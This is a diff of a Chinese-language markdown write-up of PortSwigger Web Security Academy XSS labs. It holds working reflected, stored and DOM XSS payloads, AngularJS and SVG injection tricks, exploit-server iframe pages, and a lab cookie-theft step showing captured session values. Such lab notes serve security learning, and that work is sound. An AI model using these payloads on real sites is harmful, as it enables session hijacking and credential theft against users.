@@ -5,73 +5,85 @@ description: PortSwigger Cross-site scripting
 
 ## Lab: Reflected XSS into HTML context with nothing encoded
 
+| Dimension | Description                                                                                                                                                                                             |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/reflected#what-is-reflected-cross-site-scripting<br/>https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded                                                                                                    |
+
 基礎題，無難度
 
+<!-- prettier-ignore -->
 ```html
-?search=
-<script>
-  alert(1);
-</script>
+?search=<script>alert(1)</script>
 ```
 
 ## Lab: Stored XSS into HTML context with nothing encoded
 
+| Dimension | Description                                                                                                                                                                                       |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/stored#what-is-stored-cross-site-scripting<br/>https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded                                                                                                 |
+
 基礎題，無難度
 
+<!-- prettier-ignore -->
 ```html
-<script>
-  alert(1);
-</script>
+<script>alert(1)</script>
 ```
 
 ## Lab: DOM XSS in `document.write` sink using source `location.search`
+
+| Dimension | Description                                                                                                             |
+| --------- | ----------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink                             |
 
 從來沒用過 [document.write](https://developer.mozilla.org/en-US/docs/Web/API/Document/write)，原來是已經棄用的方法，但可能有機會在老網站看到吧
 
 先觀察網站的 js
 
+<!-- prettier-ignore -->
 ```js
 function trackSearch(query) {
-  document.write(
-    '<img src="/resources/images/tracker.gif?searchTerms=' + query + '">',
-  );
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
 }
-var query = new URLSearchParams(window.location.search).get("search");
-if (query) {
-  trackSearch(query);
-}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    trackSearch(query);
+}      
 ```
 
 payload
 
+<!-- prettier-ignore -->
 ```html
-"/>
-<script>
-  alert(1);
-</script>
+"/><script>alert(1)</script>
 ```
 
 注入後會變成
 
+<!-- prettier-ignore -->
 ```html
-<img src="/resources/images/tracker.gif?searchTerms='" />
-<script>
-  alert(1);
-</script>
-'">
+<img src="/resources/images/tracker.gif?searchTerms='"/><script>alert(1)</script>'">
 ```
 
 ## Lab: DOM XSS in `innerHTML` sink using source `location.search`
 
+| Dimension | Description                                                                                                             |
+| --------- | ----------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink                                  |
+
 先觀察網站的 js 有以下程式碼
 
+<!-- prettier-ignore -->
 ```js
 function doSearchQuery(query) {
-  document.getElementById("searchMessage").innerHTML = query;
+    document.getElementById('searchMessage').innerHTML = query;
 }
-var query = new URLSearchParams(window.location.search).get("search");
-if (query) {
-  doSearchQuery(query);
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    doSearchQuery(query);
 }
 ```
 
@@ -89,24 +101,32 @@ While the property does prevent `<script>` elements from executing when they are
 
 ## Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
 
+| Dimension | Description                                                                                        |
+| --------- | -------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery              |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink |
+
 基礎題，無難度
 
+<!-- prettier-ignore -->
 ```
 ?returnPath=javascript:alert(document.cookie)
 ```
 
 ## Lab: DOM XSS in jQuery selector sink using a hashchange event
 
+| Dimension | Description                                                                                               |
+| --------- | --------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery                     |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event |
+
 先觀察網站的 js
 
+<!-- prettier-ignore -->
 ```js
-$(window).on("hashchange", function () {
-  var post = $(
-    "section.blog-list h2:contains(" +
-      decodeURIComponent(window.location.hash.slice(1)) +
-      ")",
-  );
-  if (post) post.get(0).scrollIntoView();
+$(window).on('hashchange', function(){
+    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+    if (post) post.get(0).scrollIntoView();
 });
 ```
 
@@ -114,31 +134,16 @@ $(window).on("hashchange", function () {
 
 我們先確認這段程式碼的正常邏輯，如果網址 hash 包含文章標題，就會自動 `scrollIntoView`
 
+<!-- prettier-ignore -->
 ```
 #Spider Web Security
 ```
 
 先嘗試注入點在哪裡，推測是 jQuery 的 `$`，發現這樣可以成功注入
 
+<!-- prettier-ignore -->
 ```js
 $("<img src='x' onerror='print()'>");
-```
-
-進階一點，想一下要怎麼把
-
-```js
-$(
-  "section.blog-list h2:contains(" +
-    decodeURIComponent(window.location.hash.slice(1)) +
-    ")",
-);
-```
-
-變成可注入程式碼的 expression
-
-```js
-encodeURIComponent("<img src='x' onerror='print()'>")
-#%3Cimg%20src%3D'x'%20onerror%3D'print()'%3E
 ```
 
 之後構造一個假的 Server
@@ -152,14 +157,23 @@ encodeURIComponent("<img src='x' onerror='print()'>")
 
 ## Lab: Reflected XSS into attribute with angle brackets HTML-encoded
 
+| Dimension | Description                                                                                                  |
+| --------- | ------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes                |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded |
+
 後來發現注入點在 `<input value="">` 這邊
 
+payload
+
+<!-- prettier-ignore -->
 ```
 123" autofocus onfocus="alert(0)" data-type="456
 ```
 
 會變成
 
+<!-- prettier-ignore -->
 ```html
 <input value="123" autofocus onfocus="alert(0)" data-type="456" />
 ```
@@ -168,92 +182,120 @@ encodeURIComponent("<img src='x' onerror='print()'>")
 
 ![input-onfocus](../../static/img/input-onfocus.jpg)
 
-## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
+## Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
+
+| Dimension | Description                                                                                                      |
+| --------- | ---------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes                    |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded |
 
 在 website 欄位注入 `javascript:alert(1)`，就會變成
 
+<!-- prettier-ignore -->
 ```html
 <a href="javascript:alert(1)"></a>
 ```
 
 ## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
 
+| Dimension | Description                                                                                                          |
+| --------- | -------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string               |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded |
+
 先觀察網站的 js
 
+<!-- prettier-ignore -->
 ```js
-var searchTerms = "123";
-document.write(
-  '<img src="/resources/images/tracker.gif?searchTerms=' +
-    encodeURIComponent(searchTerms) +
-    '">',
-);
+var searchTerms = '123';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
 ```
 
 題目有給 hint，是要想辦法跳出 js string，payload 如下
 
+<!-- prettier-ignore -->
 ```js
 ';alert(1);var a = '3
 ```
 
 注入後會變成
 
+<!-- prettier-ignore -->
 ```js
-var searchTerms = "";
-alert(1);
-var a = "3";
+var searchTerms = '';alert(1);var a = '3';
 ```
 
 ## Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element
 
+| Dimension | Description                                                                                                             |
+| --------- | ----------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element       |
+
 先觀察網站的 js
 
+<!-- prettier-ignore -->
 ```js
-var stores = ["London", "Paris", "Milan"];
-var store = new URLSearchParams(window.location.search).get("storeId");
+var stores = ["London","Paris","Milan"];
+var store = (new URLSearchParams(window.location.search)).get('storeId');
 document.write('<select name="storeId">');
-if (store) {
-  document.write("<option selected>" + store + "</option>");
+if(store) {
+    document.write('<option selected>'+store+'</option>');
 }
-for (var i = 0; i < stores.length; i++) {
-  if (stores[i] === store) {
-    continue;
-  }
-  document.write("<option>" + stores[i] + "</option>");
+for(var i=0;i<stores.length;i++) {
+    if(stores[i] === store) {
+        continue;
+    }
+    document.write('<option>'+stores[i]+'</option>');
 }
-document.write("</select>");
+document.write('</select>');
 ```
 
 payload
 
+<!-- prettier-ignore -->
+```js
+encodeURIComponent(`"></select><img src='x' onerror='alert(1)'>`);
 ```
-encodeURIComponent(`"></select><img src='x' onerror='alert(1)'>`)
 
+encode 以後注入到 querystring 的 storeId
+
+<!-- prettier-ignore -->
+```
 ?productId=2&storeId=%22%3E%3C%2Fselect%3E%3Cimg%20src%3D'x'%20onerror%3D'alert(1)'%3E
 ```
 
 ## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 
+| Dimension | Description                                                                                  |
+| --------- | -------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-angularjs     |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression |
+
 AngularJS 也是我不熟悉的領域 QQ，但我忘記以前在哪裡看過可以注入，成功～
 
+<!-- prettier-ignore -->
 ```js
-{
-  {
-    constructor.constructor('alert("XSS")')();
-  }
-}
+{{ constructor.constructor('alert("XSS")')() }}
 ```
 
 ## Lab: Reflected DOM XSS
 
+| Dimension | Description                                                                                                         |
+| --------- | ------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected                           |
+
 先觀察網站的 js，主要的注入點應該是 `eval`
 
+<!-- prettier-ignore -->
 ```js
 var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function () {
-  if (this.readyState == 4 && this.status == 200) {
-    eval("var searchResultsObj = " + this.responseText);
-    displaySearchResults(searchResultsObj);
-  }
+xhr.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        eval('var searchResultsObj = ' + this.responseText);
+        displaySearchResults(searchResultsObj);
+    }
 };
 xhr.open("GET", path + window.location.search);
 xhr.send();
@@ -261,42 +303,57 @@ xhr.send();
 
 試著輸入 `"`，API 回傳的是 `{"results":[],"searchTerm":"\""}`，最終嘗試
 
+<!-- prettier-ignore -->
 ```
 \"};alert(1);//
 ```
 
 讓整段變成
 
+<!-- prettier-ignore -->
 ```js
-{"results":[],"searchTerm":"\\"};alert(1);// "}
+{"results":[],"searchTerm":"\\"};alert(1);//"}
 ```
 
 ## Lab: Stored DOM XSS
 
+| Dimension | Description                                                                                                         |
+| --------- | ------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored                              |
+
 這題算蠻簡單的，嘗試三次就猜出邏輯，連 js 的邏輯都沒看
 
+<!-- prettier-ignore -->
 ```html
 </p><img src="x" onerror="alert(1)">
 ```
 
 ## Lab: Reflected XSS into HTML context with most tags and attributes blocked
 
+| Dimension | Description                                                                                                               |
+| --------- | ------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags                                  |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked |
+
 test payloads
 
+<!-- prettier-ignore -->
 ```html
-<div>123</div>
-=> Tag is not allowed
-<div>=> Tag is not allowed</div>
+<div>123</div> => Tag is not allowed
+<div> => Tag is not allowed
 ```
 
 突破口，可以關閉標籤，接下來要尋找怎麼開啟新的標籤
 
+<!-- prettier-ignore -->
 ```html
 </h1>
 ```
 
 嘗試 `Tag is not allowed` 的邏輯，推測應該是有黑名單機制
 
+<!-- prettier-ignore -->
 ```html
 <di => bypass
 <di> => bypass
@@ -310,6 +367,7 @@ alert(1)</script> => bypass
 
 偶然發現 `Attribute is not allowed`
 
+<!-- prettier-ignore -->
 ```html
 <di onload="alert(1)"></di> => Attribute is not allowed
 <di ONload="alert(1)"></di> => Attribute is not allowed
@@ -321,26 +379,43 @@ alert(1)</script> => bypass
 
 其實如果把這邊列出的所有 tags 跟 attributes 都用腳本去測試的話就可以了，不過既然我們已經知道解法，重點只是要學習解題思路，所以最後的答案是
 
+<!-- prettier-ignore -->
 ```html
 <body onresize="print(1)"></body>
 ```
 
+然後在 exploit-server 的 response body 輸入
+
+<!-- prettier-ignore -->
+```html
+encodeURIComponent(`<body onresize="print()"></body>`)
+// %3Cbody%20onresize%3D%22print()%22%3E%3C%2Fbody%3E
+<iframe src="https://0a75006f032f73af803e268000fb00bd.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+
 ## Lab: Reflected XSS into HTML context with all tags blocked except custom ones
+
+| Dimension | Description                                                                                                        |
+| --------- | ------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags                           |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked |
 
 這題是有讓我學到新的概念，就是 custom tag 也可以觸發 `on` 事件，另外 [autofocus](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Global_attributes/autofocus) 是可以在所有 tag 上的屬性
 
+<!-- prettier-ignore -->
 ```html
 <di onfocus="alert(document.cookie)" tabindex="0" autofocus></di>
 ```
 
 有了這個觀念，就可以把上面這坨塞到 querystring
 
+<!-- prettier-ignore -->
 ```js
 encodeURIComponent(`<di onfocus="alert(document.cookie)" tabindex=0 autofocus></di>`)
 https://0a7c009b044d931980202bbf0062009c.web-security-academy.net/?search=%3Cdi%20onfocus%3D%22alert(document.cookie)%22%20tabindex%3D0%20autofocus%3E%3C%2Fdi%3E
 ```
 
-之後在 exploit-server 的 body 輸入
+之後在 exploit-server 的 response body 輸入
 
 ```html
 <html>
@@ -354,6 +429,11 @@ https://0a7c009b044d931980202bbf0062009c.web-security-academy.net/?search=%3Cdi%
 使用者點擊 exploit-server 的網址就會轉到 vulnerable 網址，這題不能用 `<iframe>` 是因為 vulnerable 網址有設定 [X-Frame-Options: SAMEORIGIN](../http/iframe-security.md)
 
 ## Lab: Reflected XSS with some SVG markup allowed
+
+| Dimension | Description                                                                                    |
+| --------- | ---------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags       |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed |
 
 先用 [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 查詢 `SVG` 支援的 onEvent without user interaction
 
@@ -430,92 +510,115 @@ for (const onEvent of onEvents) {
 
 這題我只是單純卡在對 SVG 可用的 Elements 跟 onBegin 不熟，後來直接請 AI 給我 `onbegin` 的範例，最終測出
 
+<!-- prettier-ignore -->
 ```html
-<svg>
-  <animateTransform onbegin="alert(1)" attributeName="transform" dur="0.1s" />
-</svg>
+<svg><animateTransform onbegin="alert(1)" attributeName="transform" dur="0.1s" /></svg>
 ```
 
 ## Lab: Reflected XSS in canonical link tag
+
+| Dimension | Description                                                                                   |
+| --------- | --------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag     |
 
 <!-- todo-yusheng -->
 
 ## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
 
+| Dimension | Description                                                                                                             |
+| --------- | ----------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#terminating-the-existing-script                      |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped |
+
 這題應該是 [Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded](#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded) 的進階版
 
 先觀察網站的 js
 
+<!-- prettier-ignore -->
 ```js
-var searchTerms = "123";
-document.write(
-  '<img src="/resources/images/tracker.gif?searchTerms=' +
-    encodeURIComponent(searchTerms) +
-    '">',
-);
+var searchTerms = '123';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
 ```
 
-我後來發現其實 [terminating-the-existing-script](https://portswigger.net/web-security/cross-site-scripting/contexts#terminating-the-existing-script) 這個章節就有提供答案了，這題既然沒辦法用單引號跟反斜線的話，那就直接用 `</script>` 來提前關閉 tag
+payload
 
+<!-- prettier-ignore -->
 ```html
 </script><img src=1 onerror=alert(document.domain)>
 ```
 
 ## Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 
+| Dimension | Description                                                                                                                                         |
+| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string                                              |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped |
+
 [breaking-out-of-a-javascript-string](https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string) 有給提示
 
 payload
 
+<!-- prettier-ignore -->
 ```
 \';alert(1);//
 ```
 
 會產生
 
+<!-- prettier-ignore -->
 ```js
-var searchTerms = "\\";
-alert(1); //';
+var searchTerms = '\\';alert(1);//';
 ```
 
-## Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+## Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
 
-[making-use-of-html-encoding](https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding) 有給提示
+| Dimension | Description                                                                                                                                                    |
+| --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding                                                                 |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped |
 
-payload
+在留言的 website 欄位輸入以下 payload
 
+<!-- prettier-ignore -->
 ```
 https://&apos;-alert(document.domain)-&apos;
 ```
 
 result
 
+<!-- prettier-ignore -->
 ```html
-<a
-  id="author"
-  href="https://'-alert(document.domain)-'"
-  onclick="var tracker={track(){}};tracker.track('https://'-alert(document.domain)-'');"
-  >2312312</a
->
+<a id="author" href="https://'-alert(document.domain)-'" onclick="var tracker={track(){}};tracker.track('https://'-alert(document.domain)-'');">123</a>
 ```
 
 ## Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 
-這題也是看了 [xss-in-javascript-template-literals](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals) 就可以秒解的
+| Dimension | Description                                                                                                                                                        |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals                                                             |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped |
 
 payload
 
+<!-- prettier-ignore -->
 ```js
 ${alert(document.domain)}
 ```
 
 會產生以下
 
+<!-- prettier-ignore -->
 ```js
 var message = `0 search results for '${alert(document.domain)}'`;
 ```
 
 ## Lab: Exploiting cross-site scripting to steal cookies
+
+| Dimension | Description                                                                                                           |
+| --------- | --------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-steal-cookies |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies                             |
 
 這題本來是設計給有買 Burp Suite Professional 的人類，但 hint 有說到，也有方法不需要
 
@@ -549,6 +652,7 @@ var message = `0 search results for '${alert(document.domain)}'`;
 
 3. 看到受害者瀏覽留言後，會發送一個留言
 
+<!-- prettier-ignore -->
 ```
 secret=HEta6nCEhiztNlcHwjpE1PimJ3lpxmhJ;
 session=RlrBG3zwpRjdyVblTWlne4ILI38vhc4m
@@ -564,6 +668,11 @@ fetch(
 ```
 
 ## Lab: Exploiting cross-site scripting to capture passwords
+
+| Dimension | Description                                                                                                               |
+| --------- | ------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords                              |
 
 跟上一題的情況一樣，只是現在要改偷登入頁的帳密。這題原本的概念是，要把偷到的帳密送到自己架的 Server，但由於資安考量，PortSwigger 限制只能送到他們架的 Server（要花錢買 Burp Suite Professional），所以我們用比較危險的方式，把偷到的帳密透過留言系統顯示出來
 
@@ -725,16 +834,62 @@ fetch(
 
 但這題的解法，也讓我想要重新認識瀏覽器 autofill 的安全性機制
 
+<!-- todo-yusheng -->
+
 1. 透過 `<iframe>` 開啟的登入頁，會有 autofill 的功能嗎？
 2. 透過 `window.open` 開啟的登入頁，會有 autofill 的功能嗎？
 
-<!-- todo-yusheng -->
+## Lab: Exploiting XSS to bypass CSRF defenses
+
+| Dimension | Description                                                                                                                     |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-bypass-csrf-protections |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf                                           |
 
 ## Lab: Reflected XSS with AngularJS sandbox escape without strings
 
+| Dimension | Description                                                                                                                                  |
+| --------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection                                            |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings |
+
 <!-- todo-yusheng -->
 
-[教學](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)
+## Lab: Reflected XSS with event handlers and `href` attributes blocked
+
+| Dimension | Description                                                                                                       |
+| --------- | ----------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags                          |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked |
+
+<!-- todo-yusheng -->
+
+## Lab: Reflected XSS in a JavaScript URL with some characters blocked
+
+| Dimension | Description                                                                                                   |
+| --------- | ------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string        |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked |
+
+<!-- todo-yusheng -->
+
+## Reflected XSS protected by very strict CSP, with dangling markup attack
+
+| Dimension | Description                                                                                                                                                                                                                        |
+| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/dangling-markup#what-is-dangling-markup-injection<br/>https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack                                                                                                  |
+
+<!-- todo-yusheng -->
+
+## Lab: Reflected XSS protected by CSP, with CSP bypass
+
+| Dimension | Description                                                                                                           |
+| --------- | --------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/cross-site-scripting/content-security-policy#bypassing-csp-with-policy-injection |
+| Lab       | https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass                      |
+
+<!-- todo-yusheng -->
 
 ## 參考資料
 
